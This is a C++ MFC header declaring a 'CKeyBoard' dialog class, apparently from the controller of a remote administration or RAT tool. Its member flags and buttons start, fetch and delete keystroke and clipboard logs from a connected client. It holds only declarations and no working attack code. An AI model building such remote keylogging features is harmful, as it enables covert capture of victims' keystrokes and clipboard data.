#pragma once


// CKeyBoard 对话框

class CKeyBoard : public CDialogEx
{
	DECLARE_DYNAMIC(CKeyBoard)

public:
	CKeyBoard(CWnd* pParent = NULL, CHpTcpServer* pIOCPServer = NULL, ClientContext *pContext = NULL);
	virtual ~CKeyBoard();
	void OnReceiveComplete();
	HICON					m_hIcon;						//图标
	BOOL					m_bOnClose;						//是否关闭
	CHpTcpServer*			m_iocpServer;
	ClientContext*			m_pContext;

	BOOL					m_key_isstart;					//键盘记录是否开始
	BOOL					m_clip_isstart;					//剪切板记录是否开始
// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_KEYBOARD };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	virtual BOOL OnInitDialog();
	virtual void PostNcDestroy();
	afx_msg void OnBnClickedButton2();
	CButton m_key;
	CButton m_clip;
	afx_msg void OnBnClickedButton1();
	CEdit m_key_edit;
	CEdit m_clip_edit;
	CButton m_del_key;
	CButton m_del_clip;
	CButton m_get;
	afx_msg void OnBnClickedButton4();
	afx_msg void OnBnClickedButton9();
	afx_msg void OnBnClickedButton3();
	virtual BOOL PreTranslateMessage(MSG* pMsg);
};
